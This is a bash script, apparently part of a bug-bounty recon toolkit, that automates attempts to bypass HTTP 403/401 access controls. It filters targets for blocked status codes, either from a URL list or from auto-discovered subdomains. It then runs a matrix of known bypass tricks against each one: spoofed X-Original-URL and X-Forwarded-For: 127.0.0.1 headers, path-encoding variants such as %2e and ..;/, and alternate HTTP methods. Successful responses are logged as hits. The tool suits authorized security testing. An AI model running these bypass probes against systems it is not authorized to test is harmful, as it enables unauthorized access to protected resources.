#!/bin/bash
# =============================================================================
# 403/401 Bypass Probe — try common header/method/encoding tricks against a URL
#
# Wraps byp4xx (lobuhi) when present. Falls back to a built-in matrix of the
# most-paid bypass techniques from disclosed reports so it works out of the box.
#
# Usage:
#   ./tools/bypass_403.sh <url>
#   ./tools/bypass_403.sh -l <urls-file>     # one URL per line, parallelised
# =============================================================================

set -euo pipefail

source "$(dirname "$0")/_env.sh"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/external_arsenal.sh"

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; MAG='\033[0;35m'; NC='\033[0m'
log()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
hit()  { echo -e "${MAG}[BYPASS]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1" >&2; }

DOMAIN=""; URL=""; LIST=""; QUICK=false
while [ "$#" -gt 0 ]; do
  case "$1" in
    -l|--list) shift; LIST="${1:-}" ;;
    --quick)   QUICK=true ;;
    -h|--help) sed -n '2,10p' "$0"; exit 0 ;;
    *)
      if echo "$1" | grep -q '://'; then
        URL="$1"
      else
        DOMAIN="$1"
      fi
      ;;
  esac
  shift
done

# Resolve domain → list mode: auto-discover live URLs
if [ -n "$DOMAIN" ]; then
  RECON_DIR="${RECON_BASE}/$DOMAIN"
  LIVE_DOMAINS_FILE="$RECON_DIR/subdomains/live_domains.txt"
  [ -f "$LIVE_DOMAINS_FILE" ] && [ -s "$LIVE_DOMAINS_FILE" ] || { err "live_domains.txt not found — run subdomain_enum.sh first"; exit 2; }

  # OUT_DIR must be defined before filtering targets
  OUT_DIR="${BYPASS_OUT_DIR:-$RECON_DIR/bypass}"
  mkdir -p "$OUT_DIR"

  # Filter for 403/401/400 status codes from httpx output
  RAW_LIST="$OUT_DIR/403_targets_raw.txt"
  awk '$2 ~ /^\[?40[013]\]?$/' "$LIVE_DOMAINS_FILE" | awk '{print $1}' | sort -u > "$RAW_LIST"

  if [ ! -s "$RAW_LIST" ]; then
    log "No 403/401 targets found — skipping bypass"
    exit 0
  fi

  # Quick connectivity check - only keep responsive targets
  LIST="$OUT_DIR/403_targets.txt"
  > "$LIST"
  log "Checking connectivity of $(wc -l < "$RAW_LIST") 403/401 targets..."
  while IFS= read -r u; do
    [ -z "$u" ] && continue
    # Quick HEAD request with 3s timeout - only keep if we get a real HTTP response
    code=$(curl -sk -I --max-time 3 -o /dev/null -w "%{http_code}" "$u" 2>/dev/null || echo 0)
    if [ "$code" != "000" ] && [ "$code" != "0" ]; then
      echo "$u" >> "$LIST"
    fi
  done < "$RAW_LIST"

  if [ ! -s "$LIST" ]; then
    log "No responsive 403/401 targets — skipping bypass"
    exit 0
  fi
  log "domain mode: using $LIST ($(wc -l < "$LIST" | tr -d ' ') responsive 403/401 targets)"
fi

[ -z "$URL" ] && [ -z "$LIST" ] && { err "url, domain, or -l <file> required"; exit 2; }

# ── Precondition: confirm target returns 403/401/400 ────────────────
_check_blocked() {
  local u="$1"
  local code
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$u" 2>/dev/null || echo 0)
  case "$code" in
    403|401|400) return 0 ;;
    *)           return 1 ;;
  esac
}

if [ -n "$URL" ]; then
  OUT_DIR="${BYPASS_OUT_DIR:-${RECON_BASE}/$(echo "$URL" | sed 's|https\?://||;s|/.*||')/bypass}"
  mkdir -p "$OUT_DIR"
  if ! _check_blocked "$URL"; then
    log "URL does not return 403/401/400 (skipping bypass)"
    exit 0
  fi
fi

if [ -n "$LIST" ]; then
  log "Filtering $(wc -l < "$LIST" | tr -d ' ') URLs — keeping only 403/401/400 responses ..."
  FILTERED="${LIST%.txt}_blocked.txt"
  > "$FILTERED"
  while IFS= read -r u; do
    [ -z "$u" ] && continue
    if _check_blocked "$u"; then
      echo "$u" >> "$FILTERED"
    fi
  done < "$LIST"
  if [ ! -s "$FILTERED" ]; then
    log "No targets return 403/401/400 — skipping bypass"
    exit 0
  fi
  LIST="$FILTERED"
  log "Probing $(wc -l < "$LIST" | tr -d ' ') blocked targets"
fi

if _have byp4xx; then
  log "byp4xx bypass matrix..."
  if [ -n "$URL" ]; then
    byp4xx -u "$URL" 2>/dev/null > "$OUT_DIR/byp4xx.txt" || true
  else
    byp4xx -L "$LIST" 2>/dev/null > "$OUT_DIR/byp4xx.txt" || true
  fi
  ok "byp4xx done — see $OUT_DIR/byp4xx.txt"
  exit 0
fi

# ── Probes ─────────────────────────────────────────────────────────
_top_headers() {
  # Most-paid bypass headers (fewer, faster)
  echo "GET||X-Original-URL: $1"
  echo "GET||X-Forwarded-For: 127.0.0.1"
  echo "GET||X-Custom-IP-Authorization: 127.0.0.1"
}

_full_matrix() {
  local target="$1" base="${target%/*}" last="${target##*/}"
  echo "GET|$target|X-Original-URL: $target"
  echo "GET|$target|X-Rewrite-URL: $target"
  echo "GET|$target|X-Forwarded-For: 127.0.0.1"
  echo "GET|$target|X-Forwarded-Host: localhost"
  echo "GET|$target|X-Custom-IP-Authorization: 127.0.0.1"
  echo "GET|$target|X-Client-IP: 127.0.0.1"
  echo "GET|$target|X-Host: localhost"
  echo "GET|${base}/%2e/${last}|"
  echo "GET|${base}/.${last}|"
  echo "GET|${base}/${last}/|"
  echo "GET|${base}/${last}/.|"
  echo "GET|${base}/${last};/|"
  echo "GET|${base}/${last}..;/|"
  echo "GET|${base}/${last}.json|"
  echo "GET|${base}/${last}#|"
  echo "POST|$target|"
  echo "PUT|$target|"
  echo "PATCH|$target|"
  echo "TRACE|$target|"
}

_probe_one() {
  local target="$1" found=0 combos
  log "probing $target"
  if $QUICK; then
    combos=$(_top_headers "$target")
  else
    combos=$(_full_matrix "$target")
  fi
  while IFS='|' read -r method url hdr; do
    [ -z "$url" ] && url="$target"
    args=( -sk -o /dev/null -w "%{http_code}" --max-time 5 -X "$method" )
    [ -n "$hdr" ] && args+=( -H "$hdr" )
    code=$(curl "${args[@]}" "$url" 2>/dev/null || echo 0)
    if [ "$code" = "200" ] || [ "$code" = "201" ] || [ "$code" = "204" ]; then
      hit "$method  $url  $hdr  → HTTP $code"
      echo "$method|$url|$hdr|$code" >> "$OUT_DIR/bypass_hits.txt"
      found=1
    fi
  done <<< "$combos"
  [ "$found" = "0" ] && ok "no bypass on $target"
}

if [ -n "$URL" ]; then
  _probe_one "$URL"
else
  while IFS= read -r u; do
    [ -z "$u" ] && continue
    _probe_one "$u"
  done < "$LIST"
fi
